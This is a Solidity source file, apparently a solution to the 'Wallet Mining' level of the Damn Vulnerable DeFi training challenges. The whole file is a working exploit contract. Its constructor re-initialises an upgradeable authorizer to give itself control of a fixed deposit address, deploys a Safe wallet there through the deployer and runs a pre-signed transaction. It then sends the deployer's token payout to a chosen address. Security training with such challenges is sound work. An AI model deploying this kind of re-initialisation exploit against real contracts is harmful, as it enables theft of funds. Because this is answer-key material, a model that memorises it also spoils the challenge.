// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Enum, Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {AuthorizerUpgradeable} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract WalletMiningAttacker {
    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;

    constructor(
        AuthorizerUpgradeable authorizer,
        WalletDeployer walletDeployer,
        bytes memory wat,
        uint256 salt,
        bytes memory execT_data,
        address ward
    ) {
        address attack = address(this);
        address[] memory _wards = new address[](1);
        address[] memory _aims = new address[](1);
        _wards[0] = attack;
        _aims[0] = USER_DEPOSIT_ADDRESS;
        authorizer.init(_wards, _aims);
        walletDeployer.drop(USER_DEPOSIT_ADDRESS, wat, salt);

        {
            (
                address to,
                uint256 value,
                bytes memory data,
                Enum.Operation operation,
                uint256 safeTxGas,
                uint256 baseGas,
                uint256 gasPrice,
                address gasToken,
                address payable refundReceiver,
                bytes memory signatures
            ) = abi.decode(
                execT_data,
                (address, uint256, bytes, Enum.Operation, uint256, uint256, uint256, address, address, bytes)
            );

            Safe(payable(USER_DEPOSIT_ADDRESS)).execTransaction(
                to, value, data, operation, safeTxGas, baseGas, gasPrice, gasToken, refundReceiver, signatures
            );
        }

        DamnValuableToken(walletDeployer.gem()).transfer(ward, walletDeployer.pay());
    }
}
